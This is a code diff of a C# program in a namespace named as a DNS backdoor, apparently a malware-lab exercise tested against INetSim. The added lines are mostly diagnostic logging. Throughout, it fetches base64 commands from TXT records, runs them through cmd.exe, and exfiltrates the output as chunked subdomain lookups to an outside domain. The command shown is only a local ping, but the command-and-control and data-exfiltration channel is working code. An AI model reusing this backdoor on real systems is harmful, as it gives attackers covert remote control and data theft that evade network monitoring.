@@ -13,30 +13,6 @@ namespace A06_6_DNS_Backdoor
         private const ushort DNS_TYPE_TEXT = 0x0010;
         private const uint DNS_QUERY_STANDARD = 0x00000000;
 
-        // Force explicit byte alignment to ensure structural predictability across platforms
-        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
-        private struct DNS_TXT_DATA
-        {
-            public uint dwStringCount;
-            // Explicitly define as an array pointer block matching architectural word size
-            public IntPtr pStringArray;
-        }
-
-        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
-        private struct DNS_RECORD
-        {
-            public IntPtr pNext;
-            public string pName;
-            public ushort wType;
-            public ushort wDataLength;
-            public uint flags;
-            public uint dwTtl;
-            public uint dwReserved;
-            // Native alignment pads bytes between dwReserved and the structure data union block.
-            // On 64-bit systems, this ensures data pointers match 8-byte boundaries.
-            public DNS_TXT_DATA Data;
-        }
-
         [DllImport("dnsapi.dll", CharSet = CharSet.Unicode, EntryPoint = "DnsQuery_W")]
         private static extern int DnsQuery(
             string pszName,
@@ -54,77 +30,133 @@ namespace A06_6_DNS_Backdoor
 
         static void Main(string[] args)
         {
+            Console.WriteLine("[*] Starting DNS Polling Agent Diagnostic Session...");
+            Console.WriteLine($"[*] Target Root Domain Configuration: {RootDomain}");
+            Console.WriteLine("[*] Press Ctrl+C to terminate early.\n");
+
             while (_isRunning)
             {
-                string queryTarget = $"agent77.{RootDomain}";
-                string? rawPayload = FetchNativeTxtRecord(queryTarget);
-
-                if (!string.IsNullOrEmpty(rawPayload))
+                try
                 {
-                    string commandLine = DecodeBase64(rawPayload).ToLower().Trim();
+                    string queryTarget = $"agent77.{RootDomain}";
+                    Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] Querying INetSim via TXT lookup for: {queryTarget}...");
 
-                    if (commandLine != _lastCommand)
+                    string? rawPayload = FetchNativeTxtRecord(queryTarget);
+
+                    if (string.IsNullOrEmpty(rawPayload))
                     {
-                        _lastCommand = commandLine;
+                        Console.WriteLine("[-] Received NULL or empty raw network payload from DNS server.");
+                    }
+                    else
+                    {
+                        Console.WriteLine($"[+] Raw Network Payload Retrieved successfully: \"{rawPayload}\"");
 
-                        switch (commandLine)
+                        string commandLine = DecodeBase64(rawPayload).ToLower().Trim();
+                        Console.WriteLine($"[+] Decoded Command Value: \"{commandLine}\"");
+
+                        if (commandLine == _lastCommand)
                         {
-                            case "ping":
-                                try
-                                {
-                                    // Instantiate the process configurations
-                                    using (System.Diagnostics.Process proc = new System.Diagnostics.Process())
-                                    {
-                                        proc.StartInfo.FileName = "cmd.exe";
-                                        proc.StartInfo.Arguments = "/c ping 127.0.0.1 -n 2";
-                                        proc.StartInfo.RedirectStandardOutput = true;
-                                        proc.StartInfo.UseShellExecute = false;
-                                        proc.StartInfo.CreateNoWindow = true;
+                            Console.WriteLine($"[*] Command \"{commandLine}\" matches previously handled token. Skipping execution loop to avoid spam.");
+                        }
+                        else
+                        {
+                            Console.WriteLine($"[*] Processing updated instruction token: \"{commandLine}\"");
+                            _lastCommand = commandLine;
 
-                                        proc.Start();
+                            switch (commandLine)
+                            {
+                                case "ping":
+                                    Console.WriteLine("[*] Entering case 'ping' execution block...");
+                                    ExecuteAndExfiltratePing();
+                                    break;
 
-                                        // Read the stream contents FIRST to empty the pipe dynamically
-                                        string output = proc.StandardOutput.ReadToEnd();
+                                case "exit":
+                                    Console.WriteLine("[!] 'exit' token processed. Terminating active execution service loop.");
+                                    _isRunning = false;
+                                    break;
 
-                                        // Wait a maximum of 5 seconds for absolute thread safety, then release
-                                        proc.WaitForExit(5000);
-
-                                        if (!string.IsNullOrEmpty(output))
-                                        {
-                                            // Normalize and Base64 encode the output string
-                                            byte[] textBytes = Encoding.UTF8.GetBytes(output);
-                                            string base64Output = Convert.ToBase64String(textBytes);
-                                            base64Output = base64Output.Replace("=", "");
-
-                                            int chunkSize = 30;
-                                            for (int i = 0; i < base64Output.Length; i += chunkSize)
-                                            {
-                                                string chunk = (i + chunkSize >= base64Output.Length)
-                                                    ? base64Output.Substring(i)
-                                                    : base64Output.Substring(i, chunkSize);
-
-                                                string exfilDomain = $"data.{i / chunkSize}.{chunk}.{RootDomain}";
-
-                                                IntPtr pDummy = IntPtr.Zero;
-                                                DnsQuery(exfilDomain, 0x0001, DNS_QUERY_STANDARD, IntPtr.Zero, out pDummy, IntPtr.Zero);
-                                                if (pDummy != IntPtr.Zero) DnsRecordListFree(pDummy, 0);
-
-                                                Thread.Sleep(500); // Frame staggering delay
-                                            }
-                                        }
-                                    }
-                                }
-                                catch { }
-                                break;
-                                
-                            case "exit":
-                                _isRunning = false;
-                                break;
+                                default:
+                                    Console.WriteLine($"[-] Unknown command value received: \"{commandLine}\". No processing block available.");
+                                    break;
+                            }
                         }
                     }
                 }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"\n[CRITICAL] Top-level Exception caught in Main Loop:\n{ex.ToString()}\n");
+                }
 
+                Console.WriteLine($"[*] Main iteration complete. Sleeping for 30 seconds...\n");
                 Thread.Sleep(30000);
+            }
+        }
+
+        private static void ExecuteAndExfiltratePing()
+        {
+            try
+            {
+                Console.WriteLine("[*] Initializing System.Diagnostics.Process for cmd.exe...");
+                using (System.Diagnostics.Process proc = new System.Diagnostics.Process())
+                {
+                    proc.StartInfo.FileName = "cmd.exe";
+                    proc.StartInfo.Arguments = "/c ping 127.0.0.1 -n 2";
+                    proc.StartInfo.RedirectStandardOutput = true;
+                    proc.StartInfo.UseShellExecute = false;
+                    proc.StartInfo.CreateNoWindow = true;
+
+                    Console.WriteLine("[*] Invoking proc.Start()...");
+                    proc.Start();
+
+                    Console.WriteLine("[*] Reading StandardOutput stream content...");
+                    // Read the content fully. If the command runs indefinitely or stalls, this line hangs.
+                    string output = proc.StandardOutput.ReadToEnd();
+                    Console.WriteLine($"[+] Stream read complete. Bytes read: {output.Length}");
+
+                    Console.WriteLine("[*] Invoking proc.WaitForExit(5000)...");
+                    bool exitedCleanly = proc.WaitForExit(5000);
+                    Console.WriteLine($"[*] Process exited cleanly within timeout boundary: {exitedCleanly}");
+
+                    if (string.IsNullOrEmpty(output))
+                    {
+                        Console.WriteLine("[-] Command standard output stream was empty. Skipping data transmission step.");
+                        return;
+                    }
+
+                    Console.WriteLine("[*] Converting string output data stream to Base64 byte array elements...");
+                    byte[] textBytes = Encoding.UTF8.GetBytes(output);
+                    string base64Output = Convert.ToBase64String(textBytes).Replace("=", "");
+                    Console.WriteLine($"[+] Normalized Base64 data block generated: {base64Output.Length} characters total.");
+
+                    int chunkSize = 30;
+                    Console.WriteLine($"[*] Commencing chunk exfiltration routine over Type A records (Chunk Size: {chunkSize})...");
+
+                    for (int i = 0; i < base64Output.Length; i += chunkSize)
+                    {
+                        string chunk = (i + chunkSize >= base64Output.Length)
+                            ? base64Output.Substring(i)
+                            : base64Output.Substring(i, chunkSize);
+
+                        int indexPosition = i / chunkSize;
+                        string exfilDomain = $"data.{indexPosition}.{chunk}.{RootDomain}";
+                        Console.WriteLine($"    -> [{indexPosition}] Transmitting Frame Domain: \"{exfilDomain}\"");
+
+                        IntPtr pDummy = IntPtr.Zero;
+                        int status = DnsQuery(exfilDomain, 0x0001, DNS_QUERY_STANDARD, IntPtr.Zero, out pDummy, IntPtr.Zero);
+
+                        if (pDummy != IntPtr.Zero)
+                        {
+                            DnsRecordListFree(pDummy, 0);
+                        }
+
+                        Thread.Sleep(500);
+                    }
+                    Console.WriteLine("[+] Exfiltration process step concluded completely.");
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[-] Exception caught in ExecuteAndExfiltratePing block: {ex.Message}");
             }
         }
 
@@ -132,37 +164,44 @@ namespace A06_6_DNS_Backdoor
         {
             IntPtr pResultList = IntPtr.Zero;
 
-            // Call the native Windows DNS utility
-            int status = DnsQuery(domain, DNS_TYPE_TEXT, DNS_QUERY_STANDARD, IntPtr.Zero, out pResultList, IntPtr.Zero);
-
-            if (status == 0 && pResultList != IntPtr.Zero)
+            try
             {
-                // Read the wType field located exactly 16 bytes into the record structure to confirm it is a TXT record (0x0010)
-                ushort recordType = (ushort)Marshal.ReadInt16(pResultList, 16);
+                int status = DnsQuery(domain, DNS_TYPE_TEXT, DNS_QUERY_STANDARD, IntPtr.Zero, out pResultList, IntPtr.Zero);
 
-                if (recordType == DNS_TYPE_TEXT)
+                if (status == 0 && pResultList != IntPtr.Zero)
                 {
-                    // Bypass layout constraints: Read the string pointer array address by applying an explicit 52-byte offset
-                    IntPtr pStringArrayBase = IntPtr.Add(pResultList, 52);
+                    ushort recordType = (ushort)Marshal.ReadInt16(pResultList, 16);
 
-                    if (pStringArrayBase != IntPtr.Zero)
+                    if (recordType == DNS_TYPE_TEXT)
                     {
-                        // Dereference the array pointer to find the location of our raw ANSI string characters
-                        IntPtr pActualStringBytes = Marshal.ReadIntPtr(pStringArrayBase);
+                        IntPtr pStringArrayBase = IntPtr.Add(pResultList, 52);
 
-                        if (pActualStringBytes != IntPtr.Zero)
+                        if (pStringArrayBase != IntPtr.Zero)
                         {
-                            // Convert the raw address space into a managed C# string instance
-                            string? txtResult = Marshal.PtrToStringAnsi(pActualStringBytes);
+                            IntPtr pActualStringBytes = Marshal.ReadIntPtr(pStringArrayBase);
 
-                            // Clean up unmanaged allocations completely
-                            DnsRecordListFree(pResultList, 0);
-                            return txtResult;
+                            if (pActualStringBytes != IntPtr.Zero)
+                            {
+                                string? txtResult = Marshal.PtrToStringAnsi(pActualStringBytes);
+                                DnsRecordListFree(pResultList, 0);
+                                return txtResult;
+                            }
                         }
                     }
+                    DnsRecordListFree(pResultList, 0);
                 }
-
-                DnsRecordListFree(pResultList, 0);
+                else
+                {
+                    Console.WriteLine($"[-] DnsQuery API returned non-zero status or null pointer list. Win32 Status Code: {status}");
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[-] Unhandled Exception encountered inside FetchNativeTxtRecord memory translation: {ex.Message}");
+                if (pResultList != IntPtr.Zero)
+                {
+                    DnsRecordListFree(pResultList, 0);
+                }
             }
             return null;
         }
@@ -174,8 +213,9 @@ namespace A06_6_DNS_Backdoor
                 byte[] data = Convert.FromBase64String(base64Data);
                 return Encoding.UTF8.GetString(data);
             }
-            catch
+            catch (Exception ex)
             {
+                Console.WriteLine($"[-] Base64 Decoding failed for text block: {ex.Message}");
                 return string.Empty;
             }
         }
